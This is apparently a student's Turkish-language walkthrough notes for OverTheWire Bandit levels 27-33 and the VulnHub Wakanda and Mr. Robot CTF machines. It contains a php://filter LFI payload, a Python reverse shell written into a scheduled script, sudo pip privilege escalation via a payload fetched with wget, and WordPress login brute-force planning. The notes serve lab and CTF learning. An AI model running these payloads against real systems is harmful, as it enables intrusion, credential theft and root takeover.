+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo > yes yazıp enterlıyoruz daha sonra bandit27 nin şifresini giriyoruz.
+
+ls -la çalıştırdığımızda repo isimli bir klasör indirdiğimizi görüyoruz cd repo çalıştırıyoruz.
+
+cat README çalıştırdığımızda 
+
+The password to the next level is : bandit-28-in-şifresi 
+
+şeklinde bandit28 in şifresine ulaşabiliyoruz bu dersimizde git deki bir repository (depo / kod veya dosya bağlantısından ilgili dosyaları nasıl indirebileceğimizi öğrendik)
+
+README dosyasındaki bilgiler genellikle paylaştığımız bir koddaki veya yazılımda bunu indirip kullanacak kişilerin okuması için bazı bilgiler yer alır.
+
+
+ssh bandit28@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit28 a başarıyla bağlandığımızı görebiliriz 
+
+mkdir /tmp/atil28 > cd /tmp/atil28 çalıştırdıktan sonra ssh://bandit28-git@localhost/home/bandit28-git/repo
+
+> yes > bandit28 in şifresini giriyoruz > ls -la > cd repo 
+
+git de branch diye bir sistem var bu ayko kodu paralel olarak farklı projelerde yazıp hangisinden devam etmek istersek ondan edebileceğimiz ya da geliştirdiğimiz bu iki dosya yı birleştirebileceğimiz bir sistemdir.
+
+cat README çalıştırdığımızda 
+
+username: bandit29 
+
+password: xxxxxxx
+
+şeklinde bir çıktı alırız 
+
+git branch -r çalıştırdığımızda hangi branchlerin olduğunu görüyoruz (daha önce oluşturulmuş branchleri mi yani bunu araştır buraya yaz)
+
+git branch çalıştırdığımızda master isimli yeşil renkte bir çıktı alıyoruz (bu master ın ne olduğunu araştır buraya yaz)
+
+git tag çalıştırdığımızda neyin çıktısını alıyoruz bu komut ne işe yarar bunu araştır buraya yaz
+
+
+git log çalıştırarak da bu zamana kadar yapılan commit leri yani checkpointleri görebiliriz.
+
+gelen çıktıdaki üstten ikinci sıradaki turuncu commit: satırının yanındaki hash id yi kopyalıyoruz 
+
+git checkout kopyaladığımız-hash-id-si çalıştırdığımızda  bir önceki checkpoint e geri dönmüş olduk 
+
+bunu doğrulamak için de cat README çalıştırıyoruz. 
+
+password: satırındaki bizim bandit29 un şifresi 
+
+
+ssh bandit29bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit29a başarıyla bağlandığımızı görebiliriz 
+
+
+mkdir /tmp/atil29 > cd /tmp/atil29 
+
+git clone ssh://bandit29-git@localhost/home/bandit29-git/repo. > yes > bandit29 un şifresini yazıp enterlıyoruz 
+
+cd repo > car README.md çalıştırıyoruz 
+
+gelen çıktıda password: <no passwords in production!> yazısıyla karşılaşıyoruz 
+
+git log çalıştırdığımızda iki adet kayıt olduğunu görüyoruz.
+
+bu dersimizde loglarla bir işimiz yok bu yüzden git branc -r çalıştırıyoruz burada bir kaç tane brach olduğunu görüyoruz
+
+git checkout dev çalıştırıyoruz ardından git branch çalıştırdığımızda dev isimli branch e geçtiğimizi görebiliriz ardından git log çalıştırıyoruz ve bir çok log olduğunu görüyoruz ardından cat README.md çalıştırıyoruz.
+
+ve bandit30 un şifresini password: satırında görebiliyoruz 
+
+ssh bandit30ndit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit30 aşarıyla bağlandığımızı görebiliriz
+
+ardından 
+
+mkdir /tmp/atil30 
+
+cd /tmp/atil30 
+
+git clone ssh://bandit30-git@localhost/home/bandit30-git/repo. > yes > bandit30 un şifresi > cd repo > cat README.md 
+
+just an empty file... muhahaha çıtkısını aldık bizi trollüyor.
+
+ardından git log çalıştırdığımızda sadece bir kayıt olduğunu görüyoruz 
+
+git tag çalıştırdığımızda secret isimli bir tagimiz olduğunu görüyoruz 
+
+(git tag komutu ne işe yarıyor tagler neden kullanılır görevleri, faydaları nedir araştır buraya yaz)
+
+ardından git show secret çalıştırıyoruz ve bandit31 in flagi terminale geliyor. ardından; 
+
+ssh bandit31bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit31 e başarıyla bağlanıyoruz             
+
+mkdir /tmp/atil31 
+
+cd /tmp/atil31 çalıştırıyoruz ardından git clone ssh://bandit31-git@localhost/home/bandit31-git/repo. > yes 
+
+yazıp enterlıyoruz ardından bandit31 in şifresini giriyoruz ls -la > cd repo > ls -la > cat README.md çalıştırdığımızda 
+
+key.txt isminde bir dosya oluşturup içinde sadece May I come in? yazmasını ve branch imiz de master olmasını istiyor (branch tam olarak nedir branchin master olması ne anlama geliyor ve bir dosyanın branchi nasıl master yapılır araştır buraya yaz ve bize bu görevme remote repository e bu dosyayı pushlamamız gerektiğini söylüyor remoterepository ve pushlamak ne demek araştır buraya yaz)
+
+ls -la çalıştırdığımızda .gitignore isimli bir dosya olduğunu görüyoruz bu dosyanın görevi örneğin devolopment yani geliştirme yaparken yazılımla veya proje ile ilgili gizli veriler olduğunda örneğin ssh keyler veya sunucunun anahtarı vs geliştirme yapılan dosyaların içerisinde olurlar ancak bunları github a koymayız çünkü güvenlik açısından bir zaafiyet oluşturur bu yüzden bunları gitignore dosyasının içerisine koyarız ki bir bu dosyayı github a push ettiğimizde yanlışlıkla bu özel dosyalar da gitmesinler 
+
+cat .gitignote çalıştırdığımızda *.txt çıktısını alıyoruz bu da bütün .txt uzantılı dosyaları ignore et anlamına geliyor 
+
+bu seviyenin 2 türlü çözümü var birincisi istediği şekilde bir dosya oluturmak ikincisi de .gitignore dosyasını silmek 
+
+biz öncelikle istediği dosyayı oluşturarak çözümü gerçekleştirelim.
+
+echo "May I come in?" > key.txt > ls -la > cat key.txt çalıştırdığımızda May I come in? yani içerisine istediğimiz metni yazdırdıığmızı görüyoruz şimdi istediği dosyayı oluşturduk şimdi bu dosyayı push etmemiz gerekiyor. ama öncelikle key.txt yi commit edelim (commit etmek ne demek araştır buraya yaz);
+
+git add key.txt çalıştırıyoruz (bu komut ne işe yarıyor araştır buraya yaz)
+
+git commit -m "new commit" çalıştırıyoruz (bu komutla neyi gerçekleştirdik ve -m parametresi ne anlama geliyor araştır buraya yaz) ardından son olarak commit ettiğimiz dosyayı pushlayabiliriz 
+
+git push > yes > bandit31 in şifresini girip enterlıyoruz ve aldığımız çıktıda sondan 5. remote: yazan satırda
+
+bandit32 nin şifresini aldığımızı görebiliyoruz 
+
+ssh bandit32bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit32 ye başarıyla bağlandığımızı görebiliriz 
+
+bu bölümümüz bandit in son bölümü bu seviyede uppercase shell isimli bir shell de komutlarımızı yazmayı deneyeceğiz ama burada şöyle bir engel var karşımızda örneğin ls veya echo gibi komutlar çalıştırdığımızda shell bunları büyük harfe çevirerek çalıştırıyor ve komutumuzu LS şeklinde çalıştırdığı için 
+
+sh: 1: LS: not found çıktısını alıyoruz bu uppercase shell de örneğin cat passwd.txt komutu çalıştırıldığında 
+ortam değişkeni olarak cat -komutu- $0 (yani 0 isimli bir ortam değişkenine), passwd.txt de ($1 /örneğin bu değişken isimleri değişebilir) atanıyor (komutu çalıştırırken o an mı atanıyor yoksa daha önceden sistem tarafından atanmış mı bir de normal shell de linux da vs her komutun bir ortam dğeişkeni var mı araştır buraya yaz yani bu seviyedeki senaryoyu bir sistemde korumalı bir shell olduğu durumlarda kullanabilir miyiz)
+
+biz de bu $ortamdeğişeni-ismi ni değiştirerek ve rastgele bir ortam değişkeni ismi vererek uppercase den çıkmaya çalışacağız 
+
+$0 çalıştırdığımızda uppercase den çıktığımızı ve normal shell şekilnde açtığımızı / normal shell e geçtiğimizi görüyoruz şimdi de shell in versiyonunu değiştirerek bandit33 ün şifresini alabiliriz 
+
+(linuxda $SHELL çalıştırarak üzerinde işlem yaptığımız ilgili shell in versiyonunu ve ismini görebiliriz)
+
+ardından ($0 çalıştırdıktan sonra) export SHELL=/bin/bash > $SHELL çalıştırdığımızda bash shell ine geçiş yaptığımızı görebiliyoruz burada SHELL ismindeki ortam değişkenini /bin/bash olarak değiştirip $SHELL şeklinde çağırarak bash shellimizi açtık 
+
+ardından cat/etc/bandit_pass/bandit33 çalıştırdığımızda bandit33 ün flagini almayı başarırız 
+
+bu dersimizde wakanda isimli ctf i çözelim 
+
+https://www.vulnhub.com/entry/wakanda-1,251/ adresindeki Download başlığından ilgili sanal makinayı indirebiliriz ve Description kısmından da ctf ile iligli açıklamalara bakabiliriz.
+
+indirdikten sonra wakanda nın ayarlarından promiscuous > allow all yapıyoruz NAT Network e alacak isek onu ve tüketeceği kaynakları ayarlıyoruz.
+
+wakanda (sadece virtual box da çalışıyor olabilir o yüzden vmware kullanıyorsak orada çalışmayabilir)
+
+ardından wakanda yı başlatıyoruz ve bize siyah bir ekranda login parolasını soruyor 
+
+daha sonra kalimizi açıyoruz burada wakanda nın ip adresini bulmak için netdiscover veya nmap kullanabiliriz.
+
+öncelikle ifconfig çalıştırarak kalimizin ip adresi ne olnu öğreniyoruz.
+
+ardından netdiscover -r 10.0.2.0/24 çalıştırıp bu rangedeki ip adreslerini listelemek istediğimizi söylüyoruz (-r parametresi ne işe yarıyor bunu araştır buraya yaz)  bu ip aralıklarındaki subnetleri taramak için 
+nmap 10.0.2.0/24 komutunu da çalıştırabiliriz. 
+
+10.0.2.4 bizim ip adresimizde nmap taramasından 10.0.2.14 ip adresli bir cihaz olduğunu görüyoruz daha sonra 
+new tab den nmap -sS -sV -A -p- 10.0.2.14 çalıştırıyoruz (-p- parametresinin ilgili ip adresinin bütün portlarını taramaya yaradığını biliyorum ama diğer parametreler ne işe yarıyor faydaları ne ve hangi durumlarda kullanılır bunu araştır buraya yaz)
+
+ardından bu taramadan aldığımız sonucu wakanda ctf i ile ilgili bir txt nin içerisine not edelim.
+
+yukarıdaki nmap taramasından aldığımız çıktıda Nmap scan report for 10.0.2.14 satırındaki ip adresi hangi ip adresine tarama yaptığımızı söylüyor bize 
+
+Not shown: 61531 closed ports satırında tarama sonucu kapalı olduğuna karar verilen portların sayısı bize veriliyor.
+
+bu çıktının altındaki 
+
+PORT      STATE       SERVICE     VERSION
+
+80/tcp     open        http        Apache httpd 2.4.10 ((Debian))
+
+şeklindeki bilgi 10.0.2.14 ip adresine sahip cihazda hangi port / portların açık olduğunu / veya hangi durumda olduklarını bize gösteriyor 
+
+80 portunun state i yani durumu açık olduğunu bu portta service yani http hizmetinin çalıştığını 
+
+ve version kısmında da bu portta hangi versiyona ait webservisinin çalıştığı bize söyleniyor 
+
+versionda apache bilgisini almamız ilgili servisin web servisi olduğu anlamına geliyor 
+
+yine http-title: Vibranium Market satıırnda ilgili web servisinin title bilgisini görüyoruz.
+
+yine 
+
+111/tcp  open  rpcbind 2-4 satırındaki değer de 111 portunun açık olduğunu ve içinde rpcbind servisinin çalıştığını anlıyoruz buradan bu rpcbind 2 veya rpcbind 4 sürümüne ait bir exploit bulmayı deneyebiliriz.
+
+ardından 3333/tcp   open    ssh    OpenSSH 6.7p1 satırındaki değer yine 3333 portunda ssh servisinin çalıştığını ve bu ssh servisinin versiyonu bize verilmiş burada şunu görüyoruz ki ssh default   olarak        22 portunda çalışan bir servistir ancak kendi portunda değil de güvenlik önmeli olarak düşünüldüğü için 3333 portunda açılmış 
+
+Running: Linux 3.X| 4.X satırındaki değer wakanda da kullanılan işletim sistemi nin yani çalışan işletim sisteminin linux olduğunu bize ifade eden satırdır.
+
+https://book.hacktricks.xyz/ bu bağlantıda bir hacker bu güne kadar çözmüş olduğu ctflerden elde ettiği bütün bilgileri kitap haline getirmiş ve pek çok farklı konuda örneğin linux / windows da privilege escalation nasıl yapılır ne şekillerde yapılabilir bunları paylaştığı bir websitesi oluşturmuş buradan ihtiyacımız olan konularda yardım alabiliriz.
+
+ardından kali firefox tarayıcımızdan 10.0.2.14 adresine gidiyoruz 
+
+karşımıza açılan sayfada sağ tık > view page source a tıklayıp bu sayfa oluşturulurken kullanılan html kodlarını görebiliriz 
+
+karşımıza çıkan html kodlarından 29. satırdaki <!-- ile başlayan bir yorum satırı var bu yorum satırında 
+
+bir nutona basıldığında sayfanın ?lang=fr şeklinde değişeceğini web tasarımcı yorum satırına almış bu da demek olabilir ki sayfada ?lang=fr isimli bir uç nokta olabilir bunu denemek için;
+
+10.0.2.14/?lang=fr çalıştırdığımızda sayfanın dilinin fransızca olduğunu göreibliyoruz biz bu şekilde manuel olarak bir websitesinde istediğimiz uç noktalara gidebiliyorsak burada directory traversal açığı olabilir 
+
+bir websitesinde hazır directory traversal payloadlarını denemek için dotdotpwn toolunu kullanabiliriz.
+
+10.0.2.14/?lang=%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd çalıştırdıktan sonra view page source yaptığımızda yine aynı html kodlarıyla karşılaşıyoruz bir payloadı denedikten sonra view page source yapmamızın sebebi de ilgili uç noktaya gittenten sonra farklı bir html kodu tarayıcımızda açılmış olabilir 
+
+görüntü olarak bir şey değişmese de gittiğimiz dizindeki html kodları tarayıcımızda açılmış ve bir öncekinden sonra güncellendiği için bunu farketmek için biz bu işlemi yapıyoruz.
+
+rot13 bir şifreleme algoritmasıdır (url veya uri larda görürsen garipseme)
+
+burada php filter ı encoding yaparak atlatmak için 
+
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+
+payloadlarını deneyebiliriz burada payloadlar eğer çalışmaz ise sonlarındaki .php kısmını silerek index olarak bitmiş bir şekilde deneye biliriz
+
+10.0.2.14/?lang=pHp://FilTer/convert.base64-encode/resource=index.php
+
+yazıp enterladığımızda simsiyah bir ekranda en üstte bir metin olduğunu görüyoruz 
+
+sağ tık > view page source diyip bu uzun metni kopyalıyoruz ve bu kodun base64 ile şifrelenmiş bir metin olduğunu anlıyoruz (bunu nasıl anladığımızı araştır base64 ile şifrelenmiş metinler neye benzer ayırt edici özellikleri var mı?)
+
+ardından bu hashlenmiş veriyi decode etmek için https://www.base64decode.org/ adresine gidiyoruz 
+
+üst kısma hashimizi yapıştırıyoruz ardından hemen sol altındaki yeşil DECODE tuşuna basarsak aşağıdaki kutucukta hashlenmeden önceki metni görebiliriz 
+
+ve aşağıdaki kutucukta <?php ile başlayıp ?> ile biten bir kısım var biz burayla ilgileniyoruz 
+
+$password=Naimey4Ever227!!! şeklinde şifreyi bir değişken içerisine değer olarak atamış 
+
+bir şifre bulduk ama bunun neyin şifresi olduğunu bilmiyoruz şimdi bunu öğrenmemiz gerekiyor 
+
+daha önce nmap ile portları tararken ssh servisinin çalıştığını görmüştük bu şifreyi ssh ile giriş yaparken kullanabiliriz ancak hangi kullanıcı ile hedef ssiteme giriş yapmalıyız bunu bilmiyoruz 
+
+ssh root@10.0.2.14 -p 3333 çalıştırıp şifremizi girdiğimizde şifremizin geçersiz olduğunu görüyoruz yani hedef sistemdeki root kullanıcısının şifresi değilmiş bu 
+
+biz tarayıcıdan 10.0.2.14 adresine gittiğimizde açılan sayfanın en altında Made by @mamadou yazdığını görmüştük yani bu web sayfası mamadou nickine sahip biri tarafından yapılmış biz bunu görünce acaba bu bir ipucu mu diyerek hedef sistemde mamadou kullanıcısı ile bağlanmayı deneyelim 
+
+bunun için ssh mamadou@10.0.2.14 -p 3333 çalıştırıp şifremizi girdiğimizde bağlantımızı başarıyla gerçekleştirdiğimizi görebiliyoruz 
+
+suncuya mamadou kullanıcısıyla giriş yaptıktan sonra sadece python kodunu çalıştırabiliyoruz bunu teyit etmek için ls veya whoami gibi komutları çalıştırdığımızda not defined hatası alıyoruz ki bu bir python hatasıdır 
+
+bu durumda python kodu yazarak bash shell ini çağırabiliriz bunun için 
+
+import pty > pty.spawn("/bin/bash") çalıştırdığımızda bash shell ini aldığımızı görebiliyoruz 
+
+ardından whoami çalıştırdığımızda mamadou çıktısını alıyoruz 
+
+ls > cat flag1.txt çalıştırdığımızda ilk flag metnimizi buluyoruz bu flag metnimizi bir dosyanın içerisine kaydedelim 
+
+şimdi ise flag2.txt dosyasının sistemde hangi diiznde olduğunu bulmak için locate flag2.txt çalıştırdığımızda bize /home/devops/flag2.txt çıktısını veriyor 
+
+cd /home/devops$ cat flag2.txt çalıştırdığımızda permission denied hatası aldık (neden komutu yazdıktan sonra $ kullandık bu pipe gibi bir işe mi yarıyor araştır buraya yaz)
+
+ardından ls -la çalıştırdığımızda flag2.txt dosyasının kullanıcı sahipliğinin devops kullanıcısında; grup sahipliğinin de devoloper grubunda olduğunu görüyoruz yani bu durumda bizim flag2.txt dosyasının içeriğini okuyabilmemiz için devops kullanıcısı olarak bağlanmamız gerekiyor 
+
+linenum toolu ile sistemdeki açıkları tespit edebiliriz 
+
+uname -a çalıştırarak (bu komut ne işe yarıyor araştır buraya yaz) bize yazdırılan çıktıya göre sistemde bir kernel exploit var mı buna bakabiliriz 
+
+find / -user devops komutunu çalıştırarak devops kullanıcısına ait bütün klasörleri listeleyebiliriz 
+
+bunu çalıştırdığımızda neredeyse hepsini okumamıza / çalıştırmamıza yetkimizin olmadığı yazıyor 
+
+ancak en üstte hatta ilk bulduğumuz çıktıda /srv/antivirus.py isimli bir dosyamızın olduğunu ve bu dosyayı okumaya / çalıştırmaya yetkimizin olduğunu görebiliyoruz bu dosyanın altında yine çalıştırmaya iznimizin olduğu /tmp/test isimli bir dosyamızın olduğunu görüyoruz 
+
+bizim burada ilgilendiğimiz dosya /srv/antivirus.py çünkü eğer biz mamadou kullanıcısı ile bu python kodunu çalıştırabilirsek bu dosyanın içeriğini istediğimiz gibi dğeiştrebileceğimizden dolayı istediğimiz kodu yazabiliriz ve çalıştırabiliriz. (örneğin backdoor,keylogger bile yazabiliriz)
+
+ama yine de bu dosyamızdan önce cat /tmp/test çalıştırıyoruz ve önemli olmayan bir çıktı aldık 
+
+ardından cat /srv/antivirus.py çalıştırıyoruz ve open('/tmp/test', 'w').write('test') şeklinde bir çıktı alıyoruz bunun anlamı bu python dosyasını çalıştırdığımızda içindeki bu kod /tmp/test isimli dosyayı içine bir şeyler yazmak için açıp en başına test stringini ekliyor 
+
+bu dersimizde bir önceki derste bulduğumuz python dosyasındaki python kodunu değiştirerek içeriisne çalıştırıldığında reverse shell alabileceğimiz bir python kodu yerleştireceğiz bunun için de 
+
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet adresini kullanıyoruz bu bağlantıdaki 
+
+Python başlığının altındaki python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+kodunu kopyalıyoruz.
+
+cd /srv > nano .antivirus.py çalıştırıyoruz ve kodumuzu buraya yapıştırıyoruz ancak bu kod bir bash script olduğu için öncelikle bu bash kodunu bir python kodu olarak düzenleyelim bunun için 
+
+(bash scrip yazarken , (virgül) ve ; (noktalı virgül karakterleri ne anlama gleiyor ne işe yarıyor araştır buraya yaz))
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("kali-ip-miz",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocesss.call(["/bin/sh","-i"])
+
+şeklinde düzenleyip ctrl+o ve ctrl+x yapıp çıkıyoruz.
+
+ardından yeni bir terminal tabında 
+
+nc -nvlp 1234 çalıştırıp 1234 portunu dinliyoruz.
+
+cat .antivirus.py çalıştırarak dosyanın içeirğini dğeiştirdiğimizi onaylıyoruz
+
+ardından python .antivirus.py çalıştırdığımızda nc ile dinlediğimiz terminale bir session geldiğini görebiliyoruz. 
+
+id ve whoami çalıştırdığımızda gelen oturumda mamadou olarak oturum açtığımızı görüyoruz. 
+
+ardından nc ile dinlediğimiz terminale gelip ctrl+c ile çıkıp tekrar nc -nvlp 1234 çalıştırıyoruz.
+
+(reboot ve sudo reboot komutları ne işe yarıyor hacking de hangi durumlarda kullanılır araştır buraya yaz)
+
+ardından az önce mamadou olarak girdiğimiz oturumda bu sefer istediğimiz kullanıcı olan devops olarak girdik bunun sebebi antivirus.py dosyasının zamanlanmış bir task olarak belirli bir vakitte çalıştırılması olabilir 
+bu yüzden dosyayı çalıştırdıktan 1-2 dakika kadar sonra bağlantımızı gerçekleştirdiğimizde devops olarak bağlanabildik.
+
+ardından cd /home/devops > cat flag2.txt çalıştırdığımızda flag2 nin metnini almış oluruz 
+
+sudo -l çalıştırdığımızda sistemdeki mevcut giriş yaptığımız kullanıcı ile -yani devops kullanıcısı olarak- admin yetkileri ile çalıştırabileceğimiz dosyaları gösterir 
+
+sudo -l çalıştırdığımızda /usr/bin/pip şeklinde bir çıktı aldık bu şu anlama gelir biz devops kullanıcısı olarak python un paket yükleyicisi olan pip i çalıştırabiliyoruz yani bunu çalıştırmaya yetkimiz var demektir.
+
+biz pip i kullanarak fake pip isimli bir kodu indirip wakanda da çalıştırarak devops kullanıcısından root kullanıcısına yetkimizi yükseltmeyi deneyelim 
+
+bunun için de https://github.com/0x00-0x00/FakePip bağlantısındaki dosyaları kullanalım 
+
+daha sonra wakanda ya geliyoruz git çalıştırıyoruz ve not found çıktısı alıyoruz bu git in yüklü olmadığı anlamına gelir. 
+
+wget çalıştırıyoruz ve bize wget i nasıl kullanabileceğimizle ilgili bir çıktı veriyor bu da wget in wakanda da yüklü olduğu anlamına gelir.
+
+daha sonra başka bir terminal tabında git clone https://github.com/0x00-0x00/FakePip
+
+çalıştırarak fakepip i indiriyoruz ardından ls > cd FakePip çalıştırıyoruz.
+
+nano setup.py çalıştırıyoruz 
+
+LHOST satırındaki değeri (yukarıdak 8. satırda) buradaki ip adresini kalimizin local-ip-si olarak değişiriyoruz 
+
+ardından ctrl+o > ctrl+x yaparak çıkıyoruz 
+
+şimdi ise biz bu dosyayı kali lokalimize indirip burada dğeiştirdiğimiz için bunu wakanda ya atmamız / yollamamız lazım 
+
+bunun için apache2 servisini kullanabiliriz bunu yapmak için de 
+
+cp setup.py /var/www/html > service apache2 start çalıştırıyoruz amacımız apache2 servisi ile bir lokal websitesi oluşturup ardından wakanda ya gelip kali local ip mizi yapıp /var/www/html dizinine kopyaladığımız dosyayı kendi lokaline indirip çalıştırmak ve root olmak 
+
+ardından wakanda ya gelip wget http://kali-local-ip/setup.py çalıştırıyoruz 
+
+ardından ls -la yaptığımızda wakanda nın lokaline setup.py dosyasını indirdiğimizi göreibliyoruz 
+
+ardından kali terminalimize gelip nc -nvlp 13372 (setup py de bağlanılacak port numarası) çalıştırarka ilgili portu dinlemeye başladık 
+
+wakanda d terminalde setup.py in bulunduğu dizindeyken 
+
+ sudo /usr/bin/pip install . --upgrade --force-reinstall çalıştırıyoruz ardından nc in çalıştığı terminale geldiğimizde sessionımızın root olarak geldiğini görüyoruz whoami çalıştırdığımızda root olduğumuzu görüyoruz 
+
+ ardından root flag ini almak için locate root.txt çalıştırıyoruz root.txt nin konumunu bulmak için 
+
+ cat /root/root.txt çalıştırdığımızda root flag i başarıyla aldığımızı görebiliriz
+
+ 
+ bu dersimizde mr robot isimli zaafiyetli makinanaın çözümünü görelim 
+
+ https://www.vulnhub.com/entry/mr-robot-1,151/ bağlantısından mr robot u indirebiliriz .
+
+ öncelikle kalimizde ifconfig çalıştırarak hangi subnetteyiz onu öğreniyoruz örneğin 10.0.2.x subnetinde isek
+
+ nmap 10.0.2.0/24 çalıştırıyoruz aldığımız çıktıda altında
+
+ PORT       STATE         SERVICE 
+
+
+tablosu olan 10.0.2.15 (bu örnek için böyle her örnekte bu değişebilir) ip adresinin mr.robot un ip adresi lduğunu anlıyoruz 
+
+burada 
+
+22/tcp   closed   ssh 
+
+80/tcp    open     http 
+
+443/tcp    open     https 
+
+şeklinde 3 adet port çıktısı alıyoruz burada ssh servisinin kapatıldığını görüyoruz https den de işlem yapamayacağımızdan çünkü https de trafik şifreli olduğu için, sadece web servisi üzerinden yani http üzerinden işlem yapacağımız anlamına geliyor.
+
+
+ardından kali firefox umuzdan 10.0.2.15 adresine gidiyoruz 
+
+
+şimdi kali de application kısmına dirbuster yazarak dirbuster ı çalıştırıyoruz bu araç bir url deki normal olarak yani tıklayarak veya gözle göremediğimiz ui da gözükmeyen uç noktaları bulmamızı sağlar.
+
+ardından Target URL kısmında http://10.0.2.15/ yazarak çalıştırıyoruz.
+
+ardından Number of Threads satırındaki Go Faster! checkbox ını işaretliyruz (bunu işaretlediğimizde otomatik olarak 200 Threads olarak ayarladı)
+
+ardından onun da hemen aşağısında select scanning type satırında list based brute force u seçiyoruz 
+
+daha sonra hemen bir aşağı satırın sonundaki Browse kısmına tıklayarak /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt dosyasını seçiyoruz ardından sağ altta select list diyoruz.
+
+daha sonra başka bir özelliği değiştirmeden sağ alttan Start a basarak taramayı çalıştırıyoruz.
+
+ardından tarama başladıktan sonra gelen çıktılarda Response tabındaki 200 olan değerler direkt olarak sunucudan yani mr robot un bulunduğu sunucudan (şuan lokal olarak çalıştığımız için local sunucudan) OKAY cevabı olduğumuz yani denenen ilgili uç noktanın mr robot da mevcut olduğu anlamına gelen http kodudur
+
+ardından kali terminalimize geliyoruz nikto -h http://10.0.2.15 çalıştırıyoruz bu komutu çalıştırarak ilgili ip adresine yönelik güvenlik açıklarını taramamızı sağlayan bir araçtır 
+
+dirbuster taramamızı 10 dk geçtikten sonra aşağıda yer alan Stop butonuna basarak durduruyoruz çünkü Time to Finish kısmında 10 Days ifadesi yer alıyor yan taramanın bitmesi 10 gün sürecek diyor bi daha pratik ve hızlı olması ve bilgisayarı da bu taramayla yavaşlatmaması için bu taramayı stop yaparak durdurduk ancak pencereyi 
+x ya basarak kapatmıyoruz simge durumuna küçültüyoruz 
+
+nikto da OSVDB-3092: /admin/ şeklinde bir çıktı aldık biz dirbusterda sonuçlanana uç noktalara baktığımızda 
+
+wdp yani mr.robot ub wordpress isimli bir içerik yönetim sistemi kullandığını anladık 
+
+nikto da /admin şeklinde bir uç nokta bulduğunu söyledi bize bu yüzden firefox a gelip 
+
+10.0.2.15/admin adresine gitiğimizde arkaplanda bir imlecin sürekli yanıp söndüğünü görüyoruz view page source una bakıyoruz ancak ilginç bir şey bulamıyoruz. 
+
+ardından nikto dan 
+
+Uncommmon header: 'link' found, with contents: <http://10.0.2.155/?p=23>; şeklinde bir çıktı aldık 
+
+ardından firefoxdan http://10.0.2.155/?p=23 adresine gidiyoruz çalıştırdığımızda ilk açılıştaki yüklenme ekranı açılıyor 
+
+buradaki parametreyi değiştirip http://10.0.2.155/?p=1 adresine gittiğimizde de yine aynı animasyon ekranı karşımıza çıkıyor acaba burada bir directory traversal var mı bunu deneyebiliriz bunun için;
+
+http://10.0.2.155/../../../etc/passwd adresine gidiyoruz ancak yine başlangıçtaki yüklenme ekranı çıktı karşımıza 
+
+nikto nun çalıştığı terminale gelince /wp-login/: admin login page / section found şeklindeki bir çıktı aldık bu çıktının anlamı http://10.0.2.15/wp-login bağlantısına gidersek bu mr.robot un içerik yönetim sistemine giriş yapmamızı sağlayacak giriş ekranına gideceğimiz anlamına gelir. 
+
+wordpress kullanan sitelerde http://10.0.2.15/wp-admin bağlantısına giderek de aynı login sayfasını açabiliriz.
+
+yine çıktılar arasında /licence.txt uç noktasının tespit edildiğini söylüyor.
+
+http://10.0.2.15/licence.txt adresine gittiğimizde sanırım bu wordpress in hukuki olarak lisansının bulunduğu bir dökuman yani çok önemli bir şey değil.
+
+http://10.0.2.15/robots.txt adresine gidiyoruz karşımıza çıkan sayfanın en altında bulunan 
+
+key-1-of-3.txt uç noktasına gittiğimizde ilk flagimizi almış oluruz yani http://10.0.2.15/key-1-of-3.txt 
+
+ve robots.txt dosyasında fsocity.dic isimli bir uç noktamızın / dosyamızın olduğunu görüyoruz 
+
+http://10.0.2.15/fsocity.dic adresine gittiğimizde otomatik olarak bir .dic yani sözlük dosyasının indirilme ekranı karşımıza çıkar ve bu dosyanın boyutu bir dictionary dosyasına göre oldukça fazla 6,9 mb bir boyutu olduğunu görüyoruz.
+
+
+ardından açılan bu pencerede save file ı seçip OK diyoruz ve dosyayı lokalimize indiriyoruz.
+
+ve bu dosyayı çift tıklayarak açıyoruz buradaki kelimeleri bulmuş olduğumuz wordpress login sayfası için username ve password brute force saldırısı için deneyebiliriz.
+
+şuanki durumumuzda ne bir kullanıcı adı ne de bir şifre bilmiyoruz bunun için öncelikle bir kullanıcı adı bulalım bu işlemi burp proxy ile veya wpscan ile yapabiliriz ancak hocanın söyleidği kadarıyla wpscan de brute force yapmamız için ya kullanıcı adlarından birini ya da bir password bilip kullanıcı adı denemesi yapabiliyormuşuz bir her ikisini de bilmediğimiz için wpscan i es geçiyoruz burp ten intercept yapıp 
+wp login sayfasına username: atil password: 123 ile login olduğumuzda bu istedi sağ tık send to repeater a gönderip buradaki position lardan denenecek username ve password parametrelerini ayarlayabiliriz ancak burp community versiyonunda 1 thread yani saniyede sadece 1 deneme yapılmasına izin verilidği için bu force işlemimiz çok uzun sürer bunun yerine öncelikle hydra isimli bir tool ile username i bulup daha sonra wpscan den bu username in şifresini forcelayarak bulabiliriz.
+
+biz wp login sayfasına atil | 123 ile login olduğumuzda ERROR: Invalid username. yani HATA: Geçersiz kullanıcı adı çıktısını aldık bu hata mesajını kullanarak invalid username hatasını aldığımız sürece fsocity.dic dosyasındaki kelimeleri username olarak denemeye devam edip bu hatayı almadığımız durumları bize çıktı olarak verip bu kullanıcı adı üzerinde şifrelerimizi deneyebiliriz.
+
+kali terminalimize gelip cd /Downloads (indirdiğimiz .dic dosyasının olduğu dizine gidiyoruz) 
+
